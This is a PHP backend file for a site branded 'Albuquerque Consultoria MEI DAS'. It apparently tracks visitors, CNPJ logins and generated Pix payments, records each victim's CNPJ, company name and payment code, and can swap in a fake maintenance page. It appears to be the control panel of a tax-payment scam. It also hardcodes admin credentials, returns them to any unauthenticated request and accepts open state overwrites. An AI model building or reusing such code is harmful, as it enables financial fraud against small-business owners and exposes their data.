<?php
header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');
header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
header('Pragma: no-cache');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(204);
    exit;
}

$rootDir = dirname(__DIR__);
$stateFile = $rootDir . DIRECTORY_SEPARATOR . 'app-state.json';

$defaultState = [
    'admin' => [
        'username' => 'macaco',
        'password' => 'macaquinhoronald',
    ],
    'analytics' => [
        'visits' => 0,
        'uniqueVisitors' => 0,
        'totalClicks' => 0,
        'cnpjLogins' => 0,
        'pixGenerated' => 0,
        'paymentsConfirmed' => 0,
        'activePage' => 'primary',
        'primaryDomain' => 'albuquerqueconsultoriameidas.com',
        'pixKey' => '6769b9cc-dae0-46f1-88db-3144cc4a7ca7',
        'pixMerchantName' => 'SERVICO EMPRESARIAL ASSEGURADO ILTDA',
        'pixMerchantCity' => 'SAO PAULO',
        'secondaryTitle' => 'Estamos em manutencao',
        'secondaryMessage' => 'A equipe da Albuquerque Consultoria MEI DAS esta realizando melhorias para oferecer uma experiencia mais rapida, segura e confiavel. Em breve o atendimento sera retomado.',
        'lastVisitAt' => '',
        'lastPaymentAt' => '',
        'accessLog' => [],
        'payments' => [],
    ],
];

function merge_state(array $defaultState, array $rawState): array
{
    return [
        'admin' => array_merge($defaultState['admin'], $rawState['admin'] ?? []),
        'analytics' => array_merge($defaultState['analytics'], $rawState['analytics'] ?? []),
    ];
}

function normalized_state(array $defaultState, array $state): array
{
    $merged = merge_state($defaultState, $state);

    if (!in_array($merged['analytics']['activePage'], ['primary', 'secondary'], true)) {
        $merged['analytics']['activePage'] = 'primary';
    }

    $merged['analytics']['accessLog'] = array_slice(array_values($merged['analytics']['accessLog'] ?? []), 0, 8);
    $merged['analytics']['payments'] = array_slice(array_values($merged['analytics']['payments'] ?? []), 0, 8);

    return $merged;
}

function read_state(string $stateFile, array $defaultState): array
{
    if (!file_exists($stateFile)) {
        file_put_contents(
            $stateFile,
            json_encode($defaultState, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES),
            LOCK_EX
        );
        return $defaultState;
    }

    $raw = file_get_contents($stateFile);
    $decoded = json_decode($raw, true);

    if (!is_array($decoded)) {
        return $defaultState;
    }

    return normalized_state($defaultState, $decoded);
}

function write_state(string $stateFile, array $defaultState, array $state): array
{
    $normalized = normalized_state($defaultState, $state);

    file_put_contents(
        $stateFile,
        json_encode($normalized, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES),
        LOCK_EX
    );

    return $normalized;
}

function respond_json(array $payload, int $statusCode = 200): void
{
    http_response_code($statusCode);
    echo json_encode($payload, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
    exit;
}

function request_data(): array
{
    $data = $_GET;

    if (!empty($_POST)) {
        $data = array_merge($data, $_POST);
    }

    $rawInput = file_get_contents('php://input');
    if ($rawInput !== false && trim($rawInput) !== '') {
        $decoded = json_decode($rawInput, true);
        if (is_array($decoded)) {
            $data = array_merge($data, $decoded);
        }
    }

    return $data;
}

function decode_state_payload(string $value): ?array
{
    $decoded = json_decode($value, true);
    if (is_array($decoded)) {
        return $decoded;
    }

    $base64Decoded = base64_decode(strtr($value, '-_', '+/'), true);
    if ($base64Decoded === false) {
        return null;
    }

    $decoded = json_decode($base64Decoded, true);
    return is_array($decoded) ? $decoded : null;
}

$requestData = request_data();
$action = $requestData['action'] ?? null;
$currentState = read_state($stateFile, $defaultState);

if ($_SERVER['REQUEST_METHOD'] === 'GET' && $action === null) {
    respond_json($currentState);
}

if ($action === 'get') {
    respond_json($currentState);
}

if ($action === 'replace_state') {
    $decoded = isset($requestData['state']) ? decode_state_payload((string) $requestData['state']) : null;
    if (!is_array($decoded)) {
        respond_json(['error' => 'Invalid state payload'], 400);
    }

    respond_json(write_state($stateFile, $defaultState, $decoded));
}

if ($action === 'set_active_page') {
    $currentState['analytics']['activePage'] = ($requestData['page'] ?? 'primary') === 'secondary' ? 'secondary' : 'primary';
    respond_json(write_state($stateFile, $defaultState, $currentState));
}

if ($action === 'update_settings') {
    $title = trim((string) ($requestData['secondaryTitle'] ?? ''));
    $message = trim((string) ($requestData['secondaryMessage'] ?? ''));

    if ($title !== '') {
        $currentState['analytics']['secondaryTitle'] = $title;
    }
    if ($message !== '') {
        $currentState['analytics']['secondaryMessage'] = $message;
    }

    respond_json(write_state($stateFile, $defaultState, $currentState));
}

if ($action === 'track_visit') {
    $time = gmdate('c');
    $page = ($requestData['page'] ?? 'primary') === 'secondary' ? 'secondary' : 'primary';
    $location = trim((string) ($requestData['location'] ?? '/'));
    $isUnique = (int) ($requestData['unique'] ?? 0) === 1;

    $currentState['analytics']['visits'] += 1;
    $currentState['analytics']['lastVisitAt'] = $time;

    if ($isUnique) {
        $currentState['analytics']['uniqueVisitors'] += 1;
    }

    array_unshift($currentState['analytics']['accessLog'], [
        'time' => $time,
        'page' => $page,
        'location' => $location,
    ]);

    respond_json(write_state($stateFile, $defaultState, $currentState));
}

if ($action === 'increment_metric') {
    $metric = (string) ($requestData['metric'] ?? '');
    $amount = max(1, (int) ($requestData['amount'] ?? 1));
    $allowedMetrics = ['totalClicks', 'cnpjLogins', 'pixGenerated', 'paymentsConfirmed'];

    if (!in_array($metric, $allowedMetrics, true)) {
        respond_json(['error' => 'Invalid metric'], 400);
    }

    $currentState['analytics'][$metric] = (int) ($currentState['analytics'][$metric] ?? 0) + $amount;
    respond_json(write_state($stateFile, $defaultState, $currentState));
}

if ($action === 'log_payment') {
    $time = gmdate('c');

    $currentState['analytics']['pixGenerated'] += 1;
    $currentState['analytics']['lastPaymentAt'] = $time;

    array_unshift($currentState['analytics']['payments'], [
        'label' => trim((string) ($requestData['label'] ?? 'Pagamento Pix')),
        'amount' => trim((string) ($requestData['amount'] ?? 'R$ 0,00')),
        'status' => 'Pendente',
        'time' => $time,
        'cnpj' => trim((string) ($requestData['cnpj'] ?? '')),
        'companyName' => trim((string) ($requestData['companyName'] ?? 'Razao social nao informada')),
        'code' => trim((string) ($requestData['code'] ?? '')),
    ]);

    respond_json(write_state($stateFile, $defaultState, $currentState));
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $payload = file_get_contents('php://input');
    $decoded = json_decode($payload, true);

    if (!is_array($decoded)) {
        respond_json(['error' => 'Invalid state payload'], 400);
    }

    respond_json(write_state($stateFile, $defaultState, $decoded));
}

respond_json(['error' => 'Method not allowed'], 405);
